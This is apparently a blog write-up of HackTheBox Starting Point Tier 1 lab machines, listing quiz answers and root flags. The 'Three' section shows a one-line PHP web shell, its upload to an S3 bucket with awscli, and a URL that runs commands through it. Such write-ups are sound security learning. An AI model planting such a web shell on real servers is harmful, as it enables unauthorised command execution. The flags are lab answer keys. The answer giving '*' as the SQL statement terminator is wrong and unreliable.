---
layout: post
title: HTB — Starting Point — Tier 1
date: 2023-02-01 00:00:00 -500
categories: [HackTheBox]
tags: [WEB, MySQL, SQLi, FTP, WinRM, SMB, AWS, Cloud]
---

***

<center><strong><font color="White">You need to walk before you can run</font></strong></center>

***

## <strong><font color="#34A5DA">Appointment</font></strong>

> What does the acronym SQL stand for? `Structured Query Language`

> What is one of the most common type of SQL vulnerabilities? `SQL Injection`

> What does PII stand for? `Personally Identifiable Information`

> What is the 2021 OWASP Top 10 classification for this vulnerability? `A03:2021-Injection`

> What does Nmap report as the service and version that are running on port 80 of the target? `Apache httpd 2.4.38 ((Debian))`

> What is the standard port used for the HTTPS protocol? `443`

> What is a folder called in web-application terminology? `directory`

> What is the HTTP response code is given for 'Not Found' errors? `404`

> Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? `dir`

> What single character can be used to comment out the rest of a line in MySQL? `#`

> If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? `Congratulations`

> Submit root flag `e3d0796d002a446c0e622226f42e9672`

***

## <strong><font color="#34A5DA">Sequel</font></strong>

> During our scan, which port do we find serving MySQL? `3306`

> What community-developed MySQL version is the target running? `MariaDB`

> When using the MySQL command line client, what switch do we need to use in order to specify a login username? `-u`

> Which username allows us to log into this MariaDB instance without providing a password? `root`

> In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? `*`

> In SQL, what symbol do we need to end each query with? `*`

> There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? `htb`

> Submit root flag `7b4bec00d1a39e3dd4e021ec3d915da8`

***

## <strong><font color="#34A5DA">Crocodile</font></strong>

> What Nmap scanning switch employs the use of default scripts during a scan? `-sC`

> What service version is found to be running on port 21? `vsftpd 3.0.3`

> What FTP code is returned to us for the "Anonymous FTP login allowed" message? `230`

> After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? `anonymous`

> After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? `get`

> What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? `admin`

> What version of Apache HTTP Server is running on the target host? `Apache httpd 2.4.41`

> What switch can we use with Gobuster to specify we are looking for specific filetypes? `-x`

> Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? `login.php`

> Submit root flag `c7110277ac44d78b6a9fff2232434d16`


***

## <strong><font color="#34A5DA">Responder</font></strong>

> When visiting the web service using the IP address, what is the domain that we are being redirected to? `unika.htb`

> Which scripting language is being used on the server to generate webpages? `php`

> What is the name of the URL parameter which is used to load different language versions of the webpage? `page`

> Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" `../../../../../../../../windows/system32/drivers/etc/hosts`

> Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe" `//10.10.14.6/somefile`

> What does NTLM stand for? `New Technology Lan Manager`

> Which flag do we use in the Responder utility to specify the network interface? `-l`

> There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?. `John The Ripper`

> What is the password for the administrator user? `badminton`

> We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? `5985`

> Submit root flag `ea81b7afddd03efaa0945333ed147fac`

***

## <strong><font color="#34A5DA">Three</font></strong>

I had problems with accessing s3.thetoppers.htb. Actually, if it wasn't suggested to check it, I would not be able to enumerate this subdomain, as it was unaccessible. The solution was to add next line to `/etc/hosts`

```
<ip> thetoppers.htb s3.thetoppers.htb
```

> How many TCP ports are open? `2`

On the website we can find email@thetoppers.htb.

> What is the domain of the email address provided in the "Contact" section of the website? `thetoppers.htb`

> In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? `/etc/hosts`

> Which sub-domain is discovered during further enumeration? `s3.thetoppers.htb`

> Which service is running on the discovered sub-domain? `Amazon S3`

> Which command line utility can be used to interact with the service running on the discovered sub-domain? `awscli`

> Which command is used to set up the AWS CLI installation? `aws configure`

> What is the command used by the above utility to list all of the S3 buckets? `aws s3 ls`

> This server is configured to run files written in what web scripting language? `php`

> Submit root flag `a980d99281a28d638ac68b9bf9453c2b`

```shell
aws s3 configure
```

Just enter anything like a, a, a, a.

List files on the s3 bucket:

```shell
aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb
```

I used next reverse shell:

```php
<?php system($_GET['cmd']);?> 
```


Uploading reverse shell to s3 bucket:

```shell
aws s3 --endpoint=http://s3.thetoppers.htb cp shell.php s3://thetoppers.htb
```

After uploading reverse shell just go to: `http://thetoppers.htb/shell.php?cmd=cat+../flag.txt`

***

## <strong><font color="#34A5DA">Ignition</font></strong>

```
vladislav@Mac ~ % nmap -sVC 10.129.29.121
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 17:52 MSK
Nmap scan report for 10.129.29.121
Host is up (0.059s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Did not follow redirect to http://ignition.htb/
|_http-server-header: nginx/1.14.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds
```

> Which service version is found to be running on port 80? ``

```shell
curl -v http://10.129.29.121
```

> What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? `302`

From nmap scan:

> What is the virtual host name the webpage expects to be accessed by? `ignition.htb`

> What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? `/etc/hosts`

***

## <strong><font color="#34A5DA">Bike</font></strong>


***

## <strong><font color="#34A5DA">Funnel</font></strong>

***

## <strong><font color="#34A5DA">Pennyworth</font></strong>

***

## <strong><font color="#34A5DA">Tectics</font></strong>


### <font color="#FFA500">nuclei</font>
